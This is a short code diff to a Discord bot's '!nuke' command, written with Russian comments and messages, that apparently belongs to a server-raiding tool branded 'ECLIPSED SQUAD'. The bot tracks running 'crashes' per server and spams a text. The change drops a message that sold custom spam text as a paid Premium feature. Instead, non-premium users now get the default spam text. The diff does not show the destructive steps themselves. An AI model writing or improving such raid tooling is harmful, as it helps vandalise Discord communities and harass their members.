@@ -191,19 +191,10 @@ async def nuke(ctx, *, text: str = None):
         embed = discord.Embed(description="⚡ Краш уже запущен на этом сервере.", color=0x0a0a0a)
         await ctx.send(embed=embed)
         return
-    # Кастомный текст — только для premium
+    # Кастомный текст — только для premium или овнера
+    # Без премиума — запускаем с дефолтным текстом, кастомный игнорируем
     if text and not is_premium(ctx.author.id) and ctx.author.id != config.OWNER_ID:
-        embed = discord.Embed(
-            title="💎 PREMIUM ФУНКЦИЯ",
-            description=(
-                "Кастомный текст для `!nuke` доступен только **Premium** пользователям.\n\n"
-                "За покупкой Premium пиши в ЛС: **davaidkatt**"
-            ),
-            color=0x0a0a0a
-        )
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
-        await ctx.send(embed=embed)
-        return
+        text = None  # сбрасываем на дефолт
     nuke_running[guild.id] = True
     spam_text = text if text else config.SPAM_TEXT
     last_nuke_time[ctx.guild.id] = asyncio.get_running_loop().time()
